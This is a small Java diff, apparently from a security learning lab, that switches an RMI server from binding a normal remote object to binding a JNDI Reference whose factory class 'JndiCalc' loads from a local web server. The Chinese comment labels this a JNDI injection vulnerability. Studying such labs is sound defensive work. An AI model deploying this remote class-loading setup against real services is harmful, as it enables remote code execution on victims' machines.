@@ -8,9 +8,9 @@ public class JNDIRMIServer {
         InitialContext initialContext = new InitialContext();
         Registry registry = LocateRegistry.createRegistry(1099);
         // RMI
-         initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());
+         //initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());
         // JNDI 注入漏洞
-//        Reference reference = new Reference("JndiCalc","JndiCalc","http://localhost:7777/");
-//        initialContext.rebind("rmi://localhost:1099/remoteObj", reference);
+        Reference reference = new Reference("JndiCalc","JndiCalc","http://localhost:7777/");
+        initialContext.rebind("rmi://localhost:1099/remoteObj", reference);
     }
 }
